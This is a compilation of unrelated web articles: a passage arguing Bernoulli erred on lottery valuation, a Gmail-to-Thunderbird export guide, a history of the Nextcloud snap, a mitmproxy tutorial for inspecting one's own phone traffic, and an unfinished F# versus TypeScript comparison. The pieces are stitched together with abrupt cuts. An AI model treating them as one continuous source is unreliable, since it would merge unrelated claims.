<p>(Eq.3) &nbsp; <img src="https://s0.wp.com/latex.php?latex=%5Clangle+%5Cdelta+u+%5Crangle+%3D+%5Cleft%5Clangle%5Cln%5Cleft%28%5Cfrac%7Bx%28t%2B%5Cdelta+t%29%7D%7Bx%28t%29%7D%5Cright%29+%5Cright%5Crangle&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\langle \delta u \rangle = \left\langle\ln\left(\frac{x(t+\delta t)}{x(t)}\right) \right\rangle" title="\langle \delta u \rangle = \left\langle\ln\left(\frac{x(t+\delta t)}{x(t)}\right) \right\rangle">.</p>
<p>Now divide both sides by <img src="https://s0.wp.com/latex.php?latex=%5Cdelta+t&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\delta t" title="\delta t"></p>
<p>(Eq.4) &nbsp; <img src="https://s0.wp.com/latex.php?latex=%5Cfrac%7B1%7D%7B%5Cdelta+t%7D%5Clangle+%5Cdelta+u+%5Crangle+%3D+%5Cfrac%7B1%7D%7B%5Cdelta+t%7D+%5Cleft%5Clangle%5Cln%5Cleft%28%5Cfrac%7Bx%28t%2B%5Cdelta+t%29%7D%7Bx%28t%29%7D%5Cright%29+%5Cright%5Crangle&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\frac{1}{\delta t}\langle \delta u \rangle = \frac{1}{\delta t} \left\langle\ln\left(\frac{x(t+\delta t)}{x(t)}\right) \right\rangle" title="\frac{1}{\delta t}\langle \delta u \rangle = \frac{1}{\delta t} \left\langle\ln\left(\frac{x(t+\delta t)}{x(t)}\right) \right\rangle">.</p>
<p>What’s this? In any field other than economics, this object is called the expected exponential growth rate of wealth. No utility required, no psychology required. Digging just a little bit deeper, the whole story comes to light. Wealth dynamics are fundamentally multiplicative — we can invest wealth to generate more wealth. For such dynamics the exponential growth rate is an ergodic observable, which means its expectation value tells us what happens in the long run. Mystery solved! People just optimize what happens to their wealth over time. Crucially, additive wealth changes, <img src="https://s0.wp.com/latex.php?latex=%5Cdelta+x&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\delta x" title="\delta x"> are not ergodic, wherefore the expectation value in (Eq.1) does NOT tell us what happens over time.</p>
<p>Economics textbooks and papers miss this point. The problem is treated in an a-temporal space, as a so-called “one-shot game”. The mathematics is the mathematics of things happening in parallel universes, not of things happening over time. Where time is mentioned, it is usually wrongly assumed that <img src="https://s0.wp.com/latex.php?latex=%5Clangle+%5Cdelta+x+%5Crangle&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\langle \delta x \rangle" title="\langle \delta x \rangle"> indicates what happens over time. Endless arguments ensue over whether <img src="https://s0.wp.com/latex.php?latex=%5Cln+x&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\ln x" title="\ln x"> is the correct psychological re-weighting people apply to wealth — in reality this is a question about dynamics, with psychology as a second-order effect — of course we can be deceived, confused, or stupid and not act in our best interest. It’s also far from easy to put a number on wealth <img src="https://s0.wp.com/latex.php?latex=x%28t%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x(t)" title="x(t)">, or indeed on the different <img src="https://s0.wp.com/latex.php?latex=%5Cdelta+x&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\delta x" title="\delta x"> and their probabilities involved in real-world decisions.</p>
<p>The history of economics is a wonderful example of how a basic conceptual error prevents the detection of technical errors and inconsistencies. Without the right concepts it’s just not possible to ask the right questions, let alone find consistent answers.</p>
<h3>How much would I pay for a lottery ticket?</h3>
<p>Let’s put our conceptual troubles aside for a moment and use EUT to address precisely one of the questions Bernoulli asked. My initial wealth is <img src="https://s0.wp.com/latex.php?latex=x&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x" title="x">, I have to pay a ticket fee <img src="https://s0.wp.com/latex.php?latex=F&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="F" title="F">, and I can win prizes <img src="https://s0.wp.com/latex.php?latex=G%28n%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="G(n)" title="G(n)"> with probabilities <img src="https://s0.wp.com/latex.php?latex=p%28n%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="p(n)" title="p(n)">, where <img src="https://s0.wp.com/latex.php?latex=1%5Cleq+n+%5Cleq+N&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="1\leq n \leq N" title="1\leq n \leq N"> is a random integer denoting which of the <img src="https://s0.wp.com/latex.php?latex=N&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="N" title="N"> possible prizes I win. We imagine the lottery to take a time <img src="https://s0.wp.com/latex.php?latex=%5Cdelta+t&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\delta t" title="\delta t"> that doesn’t depend on which prize is won.</p>
<p>EUT says: find the value <img src="https://s0.wp.com/latex.php?latex=F_%7B%5Ctext%7Bmax%7D%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="F_{\text{max}}" title="F_{\text{max}}"> that makes the expected change in utility zero. If I pay more, the lottery will have a negative expected utility change, and EUT would advise me not to take part. Mathematically, here is the object we have to compute:</p>
<p>(Eq.5) &nbsp;&nbsp; <img src="https://s0.wp.com/latex.php?latex=%5Clangle%5Cdelta+u+%5Crangle%3D+%5Csum_n+p%28n%29+u%28x%2BG%28n%29-F%29+-+u%28x%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\langle\delta u \rangle= \sum_n p(n) u(x+G(n)-F) - u(x)" title="\langle\delta u \rangle= \sum_n p(n) u(x+G(n)-F) - u(x)"></p>
<p>That’s it. Now vary <img src="https://s0.wp.com/latex.php?latex=F&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="F" title="F"> so that the expected change in utility becomes zero. The value of <img src="https://s0.wp.com/latex.php?latex=F&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="F" title="F"> where that happens is the maximum fee I should pay for the lottery.</p>
<h2>Bernoulli’s error</h2>
<p>Bernoulli makes an error when he talks about this fee. The key figure is on p.26, and I’ve scribbled in red a translation of Bernoulli’s notation into the symbols used in <a href="https://doi.org/10.1063/1.4940236" target="_blank" rel="noopener">Peters and Gell-Mann (2016)</a>.</p>

<p>Let me talk you through the figure. The horizontal axis represents wealth <img src="https://s0.wp.com/latex.php?latex=x&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x" title="x">, and the vertical axis represents utility, so that the solid curve is the utility function <img src="https://s0.wp.com/latex.php?latex=u%28x%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="u(x)" title="u(x)">.</p>
<p>Let’s focus on the solid horizontal line first. The point B is the initial wealth <img src="https://s0.wp.com/latex.php?latex=x&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x" title="x">. The point p, to the left of B, represents the wealth <img src="https://s0.wp.com/latex.php?latex=x-F&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x-F" title="x-F">, that is, the initial wealth minus the ticket fee. The points C, D, E, F are wealth levels arrived at by adding to the initial wealth one of the possible prizes <img src="https://s0.wp.com/latex.php?latex=G%281%29%2C+G%282%29%2C+G%283%29%2C+G%284%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="G(1), G(2), G(3), G(4)" title="G(1), G(2), G(3), G(4)">.</p>
<p>You may already suspect the problem: let’s imagine outcome 1 occurs in the lottery, meaning we receive the prize <img src="https://s0.wp.com/latex.php?latex=G%281%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="G(1)" title="G(1)">. In that case, our wealth will change to <img src="https://s0.wp.com/latex.php?latex=x%2BG%281%29-F&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x+G(1)-F" title="x+G(1)-F">, and not <img src="https://s0.wp.com/latex.php?latex=x%2BG%281%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x+G(1)" title="x+G(1)"> (which is the position of point C). We have to subtract the fee! The points C, D, E, F marked by Bernoulli have no relevance to the problem (unless the fee is zero).</p>
<p>Now let’s walk along the utility curve. The point o marks the utility of&nbsp; wealth <img src="https://s0.wp.com/latex.php?latex=x-F&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x-F" title="x-F">, so that the dashed line po is the drop in utility associated with a drop in wealth from <img src="https://s0.wp.com/latex.php?latex=x&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x" title="x"> to <img src="https://s0.wp.com/latex.php?latex=x-F&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x-F" title="x-F">. The points G, H, L, M (to the right of B along the utility curve) represent the utilities associated with the irrelevant wealth levels <img src="https://s0.wp.com/latex.php?latex=u%28x%2BG%281%29%29%2C+u%28x%2BG%282%29%29%2C+u%28x%2BG%283%29%29%2C+u%28x%2BG%284%29%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="u(x+G(1)), u(x+G(2)), u(x+G(3)), u(x+G(4))" title="u(x+G(1)), u(x+G(2)), u(x+G(3)), u(x+G(4))">.

<p>In <a href="https://doi.org/10.1063/1.4940236">Peters and Gell-Mann (2016)</a> we call this object <img src="https://s0.wp.com/latex.php?latex=%5Clangle+%5Cdelta+u%5E%2B+%5Crangle+%3A%3D+%5Csum_n+p%28n%29+u%28x%2BG%28n%29%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\langle \delta u^+ \rangle := \sum_n p(n) u(x+G(n))" title="\langle \delta u^+ \rangle := \sum_n p(n) u(x+G(n))">, for want of a better symbol.</p>
<p>Now comes Bernoulli’s error. He claims that the lottery is to be valued by comparing <img src="https://s0.wp.com/latex.php?latex=%5Clangle+%5Cdelta+u%5E%2B+%5Crangle&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\langle \delta u^+ \rangle" title="\langle \delta u^+ \rangle"> to the loss in utility one would suffer if one were to buy the lottery ticket for its fee but not receive any prize. The key passage is on p.26–27</p>

<p>This amounts to a decision criterion, different from (Eq.5) and inconsistent with EUT. We denote with the symbol <img src="https://s0.wp.com/latex.php?latex=%5Cdelta+u%5E-&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\delta u^-" title="\delta u^-"> what Bernoulli calls “the disutility to be suffered by losing” (Bp in his notation). Now we can write Bernoulli’s decision criterion in symbols. Bernoulli tells us to buy a ticket if the following quantity is positive, and not to buy it if it’s negative</p>
<p>(Eq.6) &nbsp; <img src="https://s0.wp.com/latex.php?latex=%5Clangle+%5Cdelta+u%5E%2B%5Crangle+-+%5Cdelta+u%5E-+%3D+%5Cunderbrace%7B%5Clangle+u%28x%2BG%29+%5Crangle+-+u%28x%29%7D_%7B+%5Clangle+%5Cdelta+u%5E%2B%5Crangle%7D+-+%5Cunderbrace%7B%5Bu%28x%29+-+u%28x-F%29%5D%7D_%7B%5Cdelta+u%5E-%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\langle \delta u^+\rangle - \delta u^- = \underbrace{\langle u(x+G) \rangle - u(x)}_{ \langle \delta u^+\rangle} - \underbrace{[u(x) - u(x-F)]}_{\delta u^-}" title="\langle \delta u^+\rangle - \delta u^- = \underbrace{\langle u(x+G) \rangle - u(x)}_{ \langle \delta u^+\rangle} - \underbrace{[u(x) - u(x-F)]}_{\delta u^-}">.</p>
<h2>Error or different model?</h2>
<p>In principle, one could now say that Bernoulli just had a different model of people’s behavior than does modern economics. That would be bad enough because modern economics claims that it has the same model as Bernoulli. It’s more likely that Bernoulli got confused specifically when he tried to find the maximum fee. Otherwise he seems consistent with EUT, for instance on p.24, where he describes the certain profit (“the value of the risk in question”) that corresponds to an uncertain profit</p>

<p>Let’s really kill this. Why is (Eq.6) not a good decision criterion?</p>
<ol>
<li>It is easy to construct an example where the maximum fee I should pay, <img src="https://s0.wp.com/latex.php?latex=F_%7B%5Ctext%7Bmax%7D%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="F_{\text{max}}" title="F_{\text{max}}">, is smaller than the smallest possible prize in the lottery, but the criterion still tells me to refrain from buying a ticket. That makes no sense: such a lottery has no downside risk. I’m guaranteed a positive net profit, the only uncertain element is how much better off I will be after the game. Intriguingly — have another look at the figure — the maximum fee calculated by Bernoulli <em>is </em>smaller than the smallest possible prize, assuming that one of the prizes will be won (the distance between B and p is smaller than the distance between B and C).</li>
<li>Another problem is this: how much should I be willing to pay for one dollar, according to Bernoulli? What? … for one dollar? One dollar, of course! Yes, but not according to Bernoulli. Try it out: <img src="https://s0.wp.com/latex.php?latex=%5Clangle+%5Cdelta+u%5E%2B%5Crangle+%3C+%5Cdelta+u%5E-&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\langle \delta u^+\rangle < \delta u^-" title="\langle \delta u^+\rangle < \delta u^-"> for any non-zero number of dollars I buy in dollars, due to the concavity of the utility function. …</li></ol></div></article></div>

							<div><p>How to download all your emails from Gmail and read them somewhere else. And maybe a bit of why to do so…</p>
<p>Google reads your emails and sells your stuff to other companies – maybe. Who really knows? You can agree to their privacy policy, but do you really know in how many ways you as a Google user can be monetized? Maybe this sounds like a conspiracy theory. The bottom line is that I don’t want to be that +1 to Google so Google can sell my data or do whatever it does all under pretense that it will be better ‘experience’ for me at the end. There are many other reasons people decide do leave Google.</p>
<p>Read some of the stories :</p>
<ul>
<li>Kyle Piira <a href="https://www.kylepiira.com/2020/01/09/why-i-quit-google/">blog</a></li>
<li>Chris Wiegman <a href="https://chriswiegman.com/2019/09/leaving-big-tech-ecosystems-behind/">blog</a></li>
<li>Danny de Vries <a href="https://www.dandevri.es/articles/changing-mail/">blog</a></li>
<li>and many more … just keep goducking (a try to coin a new word for searching with <a href="https://duckduckgo.com/spread">DuckDuckGo</a>)</li>
</ul>
<p>Whether you despise Google and want out or are interested in playing with .mbox files here is how to do it.</p>
<h3>Goodbye Gmail</h3>
<p>When you decide to leave Gmail, you will want to do something with all you messages. Let say you want to download them and use them offline. Google makes it easy for you to download your data using <a href="https://takeout.google.com/">Google Takeout.</a> Fololow the link and since you want only email messages, click on <em>Deselect all</em> and check Mail like on the picture below.</p>
<p><img src="https://effilicious.com/wp-content/uploads/2020/07/gmail-mbox-1.png" alt="" width="1189" height="273" srcset="https://effilicious.com/wp-content/uploads/2020/07/gmail-mbox-1.png 1189w, https://effilicious.com/wp-content/uploads/2020/07/gmail-mbox-1-300x69.png 300w, https://effilicious.com/wp-content/uploads/2020/07/gmail-mbox-1-1024x235.png 1024w, https://effilicious.com/wp-content/uploads/2020/07/gmail-mbox-1-768x176.png 768w" sizes="(max-width: 1189px) 100vw, 1189px"></p>
<p>Scroll to the bottom and go through next couple of steps. At the end, you will get a message saying something like Google is working on it and you will get another message some time later with a download link for your data. I find their download page a bit confusing, but maybe that is just me. Download what is offered. Look for the .mbox file afterwards. If you used Gmail for several years it will be couple of GB big.</p>
<p>Next thing to do is find a way to read the emails from this .mbox file. I asked around a bit, goducked as well {guys on <a href="https://fosstodon.org/">fosstodon</a> [<a href="https://joinmastodon.org/">masstodon</a> (like twitter but better) instance for foss geeks and other peculiar characters] were helpful} and decided to use Thunderbird portable to read my .mbox file with emails.</p>
<h3>Hello Thunderbird</h3>
<p>The idea is simple: install a mail client that can read .mbox file and then import/open the file into/with the client. Thunderbird portable* can do just so. You can download it <a href="https://portableapps.com/apps/internet/thunderbird_portable">here</a>. If you want to use regular Thunderbird, you can. I have chosen portable version because I wanted to put everything (client and emails) on my USB drive and run it from there. The setup is pretty much the same for portable and regular app. After you installed Thunderbird, cheat your way through the new account setup in order get past setup dialogs and for local folders to appear in the main screen (look at the picture below) or follow the procedure as described <a href="https://commons.lbl.gov/display/~jwelcher@lbl.gov/Reading+an+mbox+file+with+Thunderbird">here</a>.</p>
<p><img src="https://effilicious.com/wp-content/uploads/2020/07/local-folders-150x98.png" alt="" width="194" height="98"></p>
<p>Depending on how you cheated so far, there should be some kind of account created and some other folders. Go to <em>Options –&gt; Account settings</em> and delete all accounts. You should be left with local folders only. Check the <em>Outgoing server</em> if you like just in case some unwanted settings ended up there.</p>
<p><img src="https://effilicious.com/wp-content/uploads/2020/07/delete-account.png" alt="" width="600" height="349" srcset="https://effilicious.com/wp-content/uploads/2020/07/delete-account.png 600w, https://effilicious.com/wp-content/uploads/2020/07/delete-account-300x175.png 300w" sizes="(max-width: 600px) 100vw, 600px"></p>
<p>Next thing to do is importing .mbox file into Thunderbird. You can do it by moving your .mbox file to your Thunderbird local directory. Look at the picture above. There is the path to the directory. Put the .mbox file there,restart Thunderbird and give it some time to deal with the .mbox file. After it finishes there should be a new folder in Local Folders with all your emails in it. Rename it to something wild like My exGmail…</p>
<hr>
<p>*there are probably many other email clients that can deal with mailbox file</p></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<div id="mediumInsert-94"><figure><img src="https://kyrofa.com/uploads/proclaim/image/image/96/nextcloud-19-login.jpg" alt=""></figure></div><p>I'm a few weeks late on celebrating Nextcloud's four year anniversary, but I'm doing it anyway! My how time flies. I became a part of the ownCloud community back in 2012. Heck, you can still find blog posts about how I ran it on this very blog if you scroll down far enough. Then, in 2015, I saw the post about the <a href="https://owncloud.org/news/western-digital-and-owncloud-team-up-to-bring-owncloud-to-home-users/">Western Digital/ownCloud</a> collaboration on what would eventually become the Nextcloud Box. But I'm getting ahead of myself.<br></p><p>The timing was excellent. We at Canonical were busy developing <a href="https://snapcraft.io/">Ubuntu Core and snaps</a>, and I had just recently joined the team responsible for developing snapcraft, the tool that creates snaps. I thought "What better way to learn the ins and outs of what I'm making than to participate in this competition!" So a few ownCloud community members and I worked on <a href="https://www.mail-archive.com/devel@owncloud.org/msg02257.html">exactly that</a>. It was ultimately selected as the platform to ship on the Box, <a href="https://karlitschek.de/2016/04/big-changes-i-am-leaving-owncloud-inc-today/">just in time to lose</a> every <a href="https://blog.jospoortvliet.com/2016/05/moving-on-from-owncloud.html">contact I had at ownCloud</a>.</p><p>I was disappointed. I assumed the project was dead. Then I heard from my friends, and was told about Nextcloud. And they retained the Western Digital contacts, who now wanted to continue the project with them!</p><p>I was excited. Within days of Nextcloud making their first release I had created a Nextcloud snap. You can still use Nextcloud v9 today, in fact:</p><pre>$ sudo snap install nextcloud --channel=9</pre><p>I'll always have fond memories of those pixelated clouds.</p><div id="mediumInsert-5"><figure><img src="https://kyrofa.com/uploads/proclaim/image/image/89/nextcloud-9.jpg" alt=""></figure></div><p>I was very happy with it. A one-line installation method for a production-ready Nextcloud. Let's Encrypt integration. Everything. Despite being created to enable the Nextcloud Box, we made sure that it worked on all architectures, so folks could run it wherever they wanted to.<br></p><p>Before too long, the <a href="https://nextcloud.com/box/">Nextcloud Box</a> became a reality, becoming a joint project between Nextcloud, Western Digital Labs, and Canonical (where Canonical was maintaining the image). At that time, we were actually having to patch Nextcloud to make it work the way we needed it to. We had tried upstreaming that patch to ownCloud, but they turned it down. Which means if you look at the config file you'll see a dirty little secret:</p><pre>/**<br> * Nextcloud doesn't support hosting the config file out of the application, so<br> * this version of Nextcloud has been patched slightly to allow for it. As a<br> * result, we fail the integrity check, so we'll just disable it.<br> */<br>'integrity.check.disabled' =&gt; true,<br></pre><p>Which I why I remember the Nextcloud v10 release so well: <a href="https://github.com/nextcloud/server/pull/1081">Nextcloud didn't have the same problem with that patch</a>, and as of v10 we no longer needed to patch it, and could re-enable the integrity check!<br></p><pre>$ sudo snap install nextcloud --channel=10<br></pre><div id="mediumInsert-11"><figure><img src="https://kyrofa.com/uploads/proclaim/image/image/90/nextcloud-10.jpg" alt=""></figure></div><p>That was a solid release, but it wasn't long before v11 was released with all sorts of security features and a preview of what was to become Nextcloud Talk in a few years:</p><pre>$ sudo snap install nextcloud --channel=11</pre><p>There was a lot of similarity between versions 9, 10, and 11, but a ton of new development went into version 12. That was great, but it also meant that a number things broke in version 12. Snaps automatically update, and this is when we really took <i>ownership</i> of that responsibility. We decided we weren't cool automatically breaking people. We've continued that attitude today, so if you've wondered why the snap lags upstream occasionally, that's why. Anyway, eventually the issues were resolved, and we got everyone onto v12:</p><pre>$ sudo snap install nextcloud --channel=12</pre><p>This release finally got rid of that dual menu setup (app menu on the left, settings/users on the right) and unified them really nicely:</p><div id="mediumInsert-34"><figure><img src="https://kyrofa.com/uploads/proclaim/image/image/92/nextcloud-12.jpg" alt=""></figure></div><p>Version 12 is still one of my favorite releases simply because no new major releases came out for almost a year. Sadly, it was also during this timeframe that Western Digital Labs shut down, thus ending the Nextcloud Box, and thus officially turning the Nextcloud snap into a personal project for me. Despite that, we settled into a groove of maintenance, and our userbase (and group of testers, who are amazing) grew significantly.<br></p><p>Version 13 saw quite a leap in functionality and design:<br></p><pre>$ sudo snap install nextcloud --channel=13</pre><p>For example, this is where Nextcloud Talk officially made its debut. It's also where they got rid of those pixelated clouds and replaced them with a nice abstract banner:<br></p><div id="mediumInsert-23"><figure><img src="https://kyrofa.com/uploads/proclaim/image/image/91/nextcloud-13.jpg" alt=""></figure></div><p>It was only a few months before the update drum started for v14, which came with all sorts of stuff like SMS 2FA and GDPR compliance:</p><pre>$ sudo snap install nextcloud --channel=14</pre><p>Nextcloud 15 took that even further:</p><pre>$ sudo snap install nextcloud --channel=15</pre><p>This is the release that added support for my beloved Yubikey, U2F, and TOTP. This is also where they introduced Nextcloud Social for a federated social network.</p><div id="mediumInsert-51"><figure><img src="https://kyrofa.com/uploads/proclaim/image/image/93/nextcloud-15.jpg" alt=""></figure></div><p>Nextcloud 16 came with a much-improved Nextcloud Talk, as well as more fine-grained permissions by way of an access control list:</p><pre>$ sudo snap install nextcloud --channel=16</pre><p>Version 17 is where the remote wipe functionality made its debut, and the shiny new Text app was introduced as the default text editor:</p><pre>$ sudo snap install nextcloud --channel=17</pre><div id="mediumInsert-71"><figure><img src="https://kyrofa.com/uploads/proclaim/image/image/94/nextcloud-17.jpg" alt=""></figure></div><p>Nextcloud 18 saw a slight rebranding. They started calling it Nextcloud Hub, and made it super easy to preinstall "recommended" apps, which included Only Office for collaborative document editing:</p><pre>$ sudo snap install nextcloud --channel=18</pre><p>And now we come to current day, version 19, where they switched to Collabora for collaborative document editing instead of Only Office:</p><pre>$ sudo snap install nextcloud --channel=19</pre><div id="mediumInsert-93"><figure><img src="https://kyrofa.com/uploads/proclaim/image/image/95/nextcloud-19.jpg" alt=""></figure></div><p>Along with Nextcloud 19, we at Canonical have started the <a href="https://ubuntu.com/appliance">Ubuntu Appliance portfolio</a>, which <a href="https://ubuntu.com/appliance/nextcloud">includes Nextcloud</a>. This is essentially a bring-your-own-box Nextcloud Box: an image with the Nextcloud snap already on there, waiting to be flashed onto a Raspberry Pi or a NUC or something. As soon as it's flashed and booted, you have a Nextcloud install.</p><p>Anyway, I hope this brief walk through history was interesting. Note that all the snap tracks used here will be open forever, so you're welcome to use even the first Nextcloud, but as a general rule of thumb, only the two most recent major releases are actually supported and receive updates. Of course, if you just want the latest stable version, you don't need to specify a track at all:</p><pre>$ sudo snap install nextcloud<br></pre><p>It's been a good four years. Here's to many more!<br></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main"><article>
  
  <div><p>From time to time I like to fire up <a href="https://mitmproxy.org/">mitmproxy</a> and route my phone’s traffic through my computer. This allows your computer, via mitmproxy, to inspect and even alter HTTP(s) requests applications and other services on your phone are performing.</p>

<p>Most recently I have been looking a bit location data and marketing. I discovered that upon launching the Deliveroo app extremely precise location data is sent to a company called <a href="https://www.braze.com/">Braze</a>. Braze has other well known customers like GAP, Microsoft, KFC, Dominos, okcupid. Not all use of Braze will send this granular location data though.</p>

<blockquote>
  <p>On app launch Deliveroo sends stupidly accurate location data(15 decimals, metre precision) to a market company called Braze(formerly AppBoy). Many other apps do similar things and it’s slightly terrifying.</p>

<h2 id="knowledge-is-power">Knowledge is Power</h2>

<p>Since knowledge is power I decided I should write up the method used here so you dear reader can also go spelunking.</p>

<p>There are many ways to install mitmproxy and they are all documented on the <a href="https://docs.mitmproxy.org/stable/overview-installation/">mitmproxy documentation site</a>. On macOS the easiest way is using the excellent tool <a href="https://brew.sh/">Homebrew</a>.</p>

<figure><pre><code data-lang="plain">brew install mitmproxy</code></pre></figure>

<p>After installing <code>mitmproxy</code> it is easy to start by just invoking it</p>

<figure><pre><code data-lang="plain">mitmproxy</code></pre></figure>

<p>mitmproxy acts as a HTTP(s) proxy and in order to tunnel your phone’s traffic through your computer you need to set the computer as a proxy on your phone.</p>

<p>On iOS this is done under <code>Wi-Fi &gt; Configure Proxy</code>. Here you want to configure a manual proxy pointing to the local ip of your computer, you can find out what your local ip is with <code>ifconfig</code> on macOS and Linux and <code>ipconfig</code> on Windows. For the port use <code>8080</code>.</p>

<p><img src="https://hugotunius.se/img/spelunking-with-mitmproxy/ios-proxy-config.jpeg?1593970295" alt=""></p>

<p>For Android consult this <a href="https://stackoverflow.com/questions/21068905/how-to-change-proxy-settings-in-android-especially-in-chrome">Stack Overflow question</a></p>

<p>At this point if you navigate to <code>http://example.com</code> on your phone the request should show up on your computer. However all HTTPS request will fail because mitmproxy is trying to man in the middle the request which will cause untrusted certificate errors. To remedy this navigate to <code>mitm.it</code> on your phone and click the icon for your OS. This will prompt you to install a root certificate for mitmproxy so it can decrypt HTTPS traffic.</p>

<p><strong>Note:</strong> You should be careful about installing root certificates as doing so can defeat HTTPS completely if the certificate is from a malicious actor. The mitmproxy certificate is fine to install.</p>

<p>On iOS you additionally need to trust the certificate under <code>General &gt; About &gt; Certificate Trust Settings</code>. At this point HTTPS request should also start showing up on your computer.</p>

<h2 id="going-spelunking">Going Spelunking</h2>

<p>Now you are ready to go spelunking. Most apps will send certain interesting requests only on startup so killing an app and starting it again is advisable. In mitmproxy you can nagivate in the request flow with the <code>j</code> and <code>k</code> keys to. Selecting a specific flow with <code>enter</code> opens a detailed overview over the request. The detailed view shows request information as well as the response the server returned. You can switch between these with <code>tab</code>. <code>q</code> takes you back to the request flow. <code>z</code> clears the request flow which can be useful when it starts filling up.</p>

<p><strong>Pro Tip:</strong> In any view in mitmproxy you can press <code>?</code> to show a list of available actions and which key(s) they are bound to.</p>

<p>The request flow can be filtered with <code>f</code> using a pretty advanced <a href="https://docs.mitmproxy.org/stable/concepts-filters/">query syntax</a>. For example when I was looking for apps that send my location data I used the following filter</p>

<figure><pre><code data-lang="plain">(~bq latitude | ~bq longitude | ~bq lat | ~bq long | ~bq lng)</code></pre></figure>

<p>If you find anything interesting feel free to <a href="https://twitter.com/k0nserv">tweet at me</a>.</p>

<p>Happy spelunking 😄</p>

    <p>While there are many UI libraries available today to build modern web apps, the number of programming languages that compile to JavaScript has also increased in recent years. Here is a quick take on F# and TypeScript.</p>
    
    <h2>Preface</h2>
<p>Although I did focus on mobile apps in the last years, I've spent the first decade or so of my career concatenating strings, also known as web development. So I think I might know a thing or two about how things work there.</p>
<p>However, as I watched the latest hype cycles in the JavaScript universe from the sidelines, I do not have many preferences when choosing "the right" technology stack. Except for one thing. I know for sure that I do not want to build serious software with JavaScript again, except when it acts as a compilation target for a more capable programming language.</p>
<p>So I did take a look at a couple of potential candidates: <a href="https://elm-lang.org/">Elm</a>, <a href="https://reasonml.org/">Reason</a>, <a href="https://www.typescriptlang.org/">TypeScript</a>, and <a href="https://fsharp.org/">F#</a>.</p>
<h2>Shortlist</h2>
<p>While I respect Elm and Reason, the overall experience seemed very close to web development with F#. Which can also be used for server-side tasks (even code-sharing between client and server is possible). So out of those four, F# and TypeScript are the most serious candidates for me. Sorry Elm. Sorry Reason.</p>
<h3>F#</h3>
<p>Since finally <a href="https://thomasbandt.com/who-cares-about-functional-programming">crossing the chasm</a> in 2017, I am a big fan of the language. As a long-time C# developer, it brought back the joy in programming to me. Making a case for using it in production at a larger scale project would intrigue me.</p>
<p>Interestingly, F# today is considered a language targeting two platforms: .NET and JavaScript. That is made possible through <a href="https://fable.io/">Fable</a>, "a compiler powered by Babel designed to make F# a first-class citizen of the JavaScript ecosystem" â€“ which sounds promising, doesn't it.</p>
<h3>TypeScript</h3>
<p>When Microsoft announced <a href="https://www.typescriptlang.org/">TypeScript</a> back in 2012, tooling was poor and excitement limited. It needed a significant player in the JavaScript world, Angular, to pick it up, to gain momentum. Today it is so widely used that I consider it the de facto standard for modern web development.</p>
<p>Its success is driven by a powerful type system plus the fact that it is similar enough to JavaScript to keep the learning curve relatively flat. Besides support for immutable data structures, I do not miss much of what I would expect from a modern programming language.</p>
<h2>A Small Case Study</h2>
<p>Now, how to make an informed decision that is not solely based on gut feelings? Good question. I decided to <a href="https://github.com/aspnetde/typesafe-spa">conduct a small case study</a>, which I designed to explore three different options to build a type-safe single page application:</p>
<ol>
<li><a href="https://github.com/aspnetde/typesafe-spa#elmish--feliz">F# + Elmish + Feliz</a></li>
<li><a href="https://github.com/aspnetde/typesafe-spa#react-function-components--feliz">F# + React Function Components + Feliz</a></li>
<li><a href="https://github.com/aspnetde/typesafe-spa#react-function-components--feliz">TypeScript + React</a></li>
</ol>
<p>In particular, I wanted to find answers to the following questions:</p>
<ol>
<li>How are parent-child relationships handled?</li>
<li>How much boilerplate code needs to be written?</li>
<li>How much guidance and support provides the compiler?</li>
<li>How maintainable, aka scalable, does the approach appear to be?</li>
</ol>
<p>The answers to those questions have already been covered in a <a href="https://thomasbandt.com/scaling-model-view-update">separate post</a>. Summary: Going with React components, either with F# or TypeScript, will make you write less code. Whereas choosing MVU (with F# + Elmish) may provide more safeguards through an architecture that is easy to understand and harder to produce errors in.</p>
<p>The bottom line is: Technically, all three approaches are valid, each of them has different strengths and weaknesses. So I cannot recommend one over the other. But I can introduce some more things to consider when making that choice.</p>
<h2>More Things To Consider</h2>
<h3>Language Qualities</h3>
